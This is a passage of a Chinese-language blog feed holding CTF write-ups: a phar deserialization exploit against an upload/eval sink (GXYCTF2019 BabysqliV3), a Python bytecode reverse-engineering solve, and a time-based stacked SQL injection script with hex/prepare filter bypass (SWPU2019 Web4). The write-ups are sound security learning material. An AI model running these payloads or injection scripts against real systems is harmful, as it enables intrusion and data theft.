class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">!=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('check token falied!');"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$uploader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$uploader</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"下面是你上传的文件：&lt;br>"</span> <span class="token operator">.</span> <span class="token variable">$uploader</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这可以执行命令，看看$cmd能否控制。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210818235954167.png"></p><p>文件上传+类似反序列化的类又没有反序列化函数，可以考虑phar</p><p>构造下pop链：</p><pre class="line-numbers language-none"><code class="language-none">__destruct() &lt;-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pop链还没构造完，发现这个代码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819001119305.png"></p><p>试了下直接传进去了</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819001144591.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819001201859.png"></p><p>幸福来的太突然</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/QQ%E5%9B%BE%E7%89%8720210819001215.jpg"></p><p>连接蚁剑，结束。</p><p>还构造个p构造。</p><p>算了还是继续学习下。</p><h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><blockquote><p>phar:伪协议可以不依赖unserialize()直接进行反序列化操作，</p></blockquote><p>$uploader为对象，这里会触发<code>__toString()</code>，而且<code>file_get_contents()</code>可以配合伪协议，就造成了phar反序列化漏洞点。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819001624504.png"></p><p>$Filename是可控的，<img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819005913757.png"></p><p>这样就可以让<code>file_get_contents()</code>去触发phar</p><p>先把token记下来</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819003715193.png"></p><p>生成phar文件然后上传。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Uploader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GXY7f17dc42f4567993f9be1dcb117e757d"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'highlight_file("/var/www/html/flag.php");'</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819005211484.png" alt="image-20210819005211484"></p><p>再用phar协议触发反序列化</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;809e1a55c1990c491e2578068d1ae0e3&#x2F;GXY7f17dc42f4567993f9be1dcb117e757d.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后随便上传个文件，返回之前反序列化的类。</p><p>其实在之前就可以感觉得到，上传文件，不会马上给出反馈，而是上传下一个文件的时候把上一个上传的结果反馈出来。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819005355530.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> phar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[极客少年挑战赛]Easy_re</title>
      <link href="/p/1953862148.html"/>
      <url>/p/1953862148.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好友发来的题，真难啊</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B-Easy-re/image-20210818212446397.png"></p><p>其实不用查，看图标也知道</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B-Easy-re/image-20210818212505103.png"></p><p>用pyinstxtractor反编译一下，找到生成的main.pyc。</p><p>然后尝试用uncompyle6反编译pyc，会发现反编译不了python3.9字节码，一看github，rocky失业在家继续捐助才能更新支持py3.9。</p><p>但强中自有强中手，有师傅想到了其他办法。</p><p>将pyc的文件头改为</p><pre class="line-numbers language-none"><code class="language-none">55 0D 0D 0A 01 00 00 00 4F D1 5B 87 C5 55 2F 42<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B-Easy-re/image-20210818213224633.png"></p><p>这样就把这个pyc识别为python3.8</p><p>然后就能反编译了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B-Easy-re/image-20210818213443646.png"></p><p>解出来代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># uncompyle6 version 3.7.4</span><span class="token comment"># Python bytecode 3.8 (3413)</span><span class="token comment"># Decompiled from: Python 3.8.10 (default, May 19 2021, 13:12:57) [MSC v.1916 64 bit (AMD64)]</span><span class="token comment"># Embedded file name: main.py</span><span class="token comment"># Compiled at: 2041-12-18 09:05:19</span><span class="token comment"># Size of source mod 2**32: 1110398405 bytes</span><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> message<span class="token punctuation">:</span>        x <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">32</span>        x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">16</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">enCodeAgain</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> space<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    string <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> space<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">,</span> space<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>                s <span class="token operator">+=</span> string<span class="token punctuation">[</span>j<span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> scorrect <span class="token operator">=</span> <span class="token string">'VxVtd5dKIPjMw9wVb=lR2WVTcPWC2goWoeQ='</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Input flag:'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enCodeAgain<span class="token punctuation">(</span>encode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> enCodeAgain<span class="token punctuation">(</span>encode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> correct<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'correct'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wrong'</span><span class="token punctuation">)</span><span class="token comment"># okay decompiling test.pyc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>enCodeAgain()</code>函数只是简单的跳一格取字符。</p><p>反编译不是很完全，有很多问题，其中有个小漏洞，师傅也发现了，这里只取了一半。所以需要补一下。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B-Easy-re/image-20210818213604413.png"></p><p>优化后的代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> message<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">enCodeAgain</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> space<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    a <span class="token operator">=</span> <span class="token string">''</span>    string <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> j <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>            s <span class="token operator">+=</span> string<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>                a <span class="token operator">+=</span> string<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> s<span class="token operator">+</span>acorrect <span class="token operator">=</span> <span class="token string">'VxVtd5dKIPjMw9wVb=lR2WVTcPWC2goWoeQ='</span>flag <span class="token operator">=</span> <span class="token string">''</span>flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enCodeAgain<span class="token punctuation">(</span>encode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逆向一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">32</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> flag<span class="token keyword">def</span> <span class="token function">deCodeAgain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token string">'VxVtd5dKIPjMw9wVb='</span>    b <span class="token operator">=</span> <span class="token string">'lR2WVTcPWC2goWoeQ='</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> s<span class="token keyword">print</span><span class="token punctuation">(</span>decode<span class="token punctuation">(</span>deCodeAgain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出<strong>flag{fEncE_1s_s0_fUn}</strong></p><p>拿回原代码执行下，输出<strong>VxVtd5dKIPjMw9wVb=lR2WVTcPWC2goWoeQ</strong>，少了个补位的=，也没差</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> Python反编译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[SWPU2019]Web4</title>
      <link href="/p/2798247945.html"/>
      <url>/p/2798247945.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[PDO|PDOSQL注入]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818131748854.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>/static/js/login.js</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818131912162.png"></p><p>怪，随手一试就登录成功了</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818141958030.png"></p><p>单引号，报语法错误，</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818161946674.png"></p><p>再加上分号又正常，所以可以尝试堆叠注入.</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818162006205.png"></p><h3 id="PDO注入"><a href="#PDO注入" class="headerlink" title="PDO注入"></a>PDO注入</h3><p>类似ORM框架吧。</p><blockquote><p>PHP数据对象（PDO）扩展为PHP访问数据库定义了一个轻量级的一致接口<br>PHP连接MySQL数据库的方式：MySQL、Mysqli、PDO</p></blockquote><p><a href="https://xz.aliyun.com/t/3950">PDO场景下的SQL注入探究</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/QQ%E5%9B%BE%E7%89%8720210818160939.png"></p><blockquote><p>Mysqli通过multi_query()函数来进行多语句执行，普通的mysqli_query()函数只执行单个语句</p><p>PDO默认支持多语句查询，如果php版本小于5.5.21或者创建PDO实例时未设置<code>PDO::MYSQL_ATTR_MULTI_STATEMENTS</code>为<code>false</code>时可能会造成<strong>堆叠注入</strong>，设置<code>$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</code>情况下可以<strong>报错注入</strong></p></blockquote><p>由于过滤了select,if,sleep,substr等大多数注入常见的单词，但是注入又不得不使用其中的某些单词。那么在这里我们就可以用16进制+mysql预处理来绕过。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">'select 123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//73656C65637420313233</span><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656C65637420313233</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> test <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818143036402.png"></p><p>那思路就很明显了,利用堆叠注入+盲注</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">'select sleep(10)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656C65637420736C65657028313029</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> test <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一般到<code>;</code>就结束了，后面也不需要用注释符，而且如果用了多行注释<code>#</code>可能会导致后面的语法执行错误。</p><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://a399ab47-58e4-4820-a59f-6c7a7efd6bb7.node4.buuoj.cn:81/index.php?r=Login/Login'''</span>    payloads <span class="token operator">=</span> <span class="token string">"asd';set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest;"</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 查询payload</span>        payload <span class="token operator">=</span> <span class="token string">"select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)"</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 将构造好的payload进行16进制转码和json转码</span>            datas <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> payloads<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str_to_hex<span class="token punctuation">(</span>                payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'test213'</span><span class="token punctuation">&#125;</span>            data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>datas<span class="token punctuation">)</span>            times <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>Timeout<span class="token punctuation">:</span>                flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 